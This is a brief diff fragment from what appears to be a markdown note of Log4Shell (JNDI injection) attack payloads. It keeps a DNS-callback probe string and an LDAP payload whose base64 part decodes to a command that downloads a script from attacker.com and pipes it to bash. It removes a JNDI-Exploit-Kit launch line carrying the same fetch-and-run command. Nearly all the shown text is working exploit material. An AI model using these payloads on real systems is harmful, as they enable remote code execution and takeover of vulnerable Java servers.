@@ -4,14 +4,10 @@
    ${jndi:ldap://abc123.dnslog.cn/x}
    ```
    ```bash
-   java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
    ```
    ```
    ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
    ```
-
-
-|------|------|---------|------|
 
 
 ```text
